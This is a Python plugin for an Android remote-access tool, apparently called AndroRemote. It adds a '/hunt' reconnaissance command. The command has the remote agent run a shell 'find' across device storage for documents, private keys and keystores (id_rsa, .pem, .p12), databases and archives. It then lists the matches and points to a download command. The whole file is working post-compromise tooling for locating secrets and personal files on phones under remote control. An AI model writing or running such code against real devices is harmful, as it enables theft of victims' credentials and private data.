"""File Hunter plugin: search and discover targeted file types across device storage."""

from typing import List
from rich.table import Table
from rich import box
from rich.markup import escape

from androremote.plugins.base import Plugin, command, PluginContext


CATEGORIES = {
    "docs": [".pdf", ".docx", ".doc", ".xlsx", ".xls", ".pptx", ".txt"],
    "keys": [".key", ".pem", ".p12", ".pfx", ".pkcs12", "id_rsa", ".keystore"],
    "db": [".db", ".sqlite", ".sqlite3", ".realm"],
    "archives": [".zip", ".tar", ".gz", ".rar", ".7z"],
    "images": [".jpg", ".jpeg", ".png", ".webp"],
}


class FileHunterPlugin(Plugin):
    name = "file_hunter"
    version = "1.0.0"
    author = "AndroRemote"
    description = "Hunt and locate targeted file types on agent storage"

    @command(
        name="hunt",
        usage="/hunt <category|extension> [path]",
        category="recon",
        description="Search for interesting files on device",
        details=(
            "Finds files by category (docs, keys, db, archives, images) or specific extension.\n"
            "Default search path is /sdcard.\n\n"
            "Examples:\n"
            "  /hunt docs\n"
            "  /hunt keys /sdcard/Download\n"
            "  /hunt .conf /data/data"
        ),
    )
    def cmd_hunt(self, args: List[str], ctx: PluginContext) -> None:
        cid = ctx.active_client
        if not cid:
            ctx.log("!", "no active session — select one with /use", "yellow")
            return

        target = args[0].lower() if args else "docs"
        search_path = args[1] if len(args) > 1 else "/sdcard"
        tag = ctx.alias_tag(cid)
        console = ctx.console

        extensions = CATEGORIES.get(target, [target if target.startswith(".") else f".{target}"])

        # Build find expression
        name_tests = " -o ".join(f'-name "*{ext}"' for ext in extensions)
        shell_cmd = f"find {search_path} -maxdepth 4 \\( {name_tests} \\) -type f 2>/dev/null | head -n 50"

        with console.status(f"[cyan]Hunting for {target} files on [bold]{escape(tag)}[/bold]...[/cyan]", spinner="dots"):
            res = ctx.send_and_wait(f"SHELL {shell_cmd}")

        if not res:
            ctx.log("!", "no response from agent", "yellow")
            return

        lines = [l.strip() for l in res.splitlines() if l.strip() and not l.startswith("OK")]

        table = Table(
            title=f"[bold cyan]FILE HUNTER[/bold cyan] · [white]{escape(target)}[/white] on [white bold]{escape(tag)}[/white bold]",
            box=box.ROUNDED,
            header_style="bold magenta",
            border_style="cyan",
            expand=True,
        )
        table.add_column("#", style="dim", width=4)
        table.add_column("File Path", style="green")

        if not lines:
            table.add_row("-", "[dim]No matching files found[/dim]")
        else:
            for idx, fpath in enumerate(lines, 1):
                table.add_row(str(idx), escape(fpath))

        console.print(table)
        console.print(f"  [dim]Found {len(lines)} files. Download with: [bold cyan]/get <remote> <local>[/bold cyan][/dim]\n")
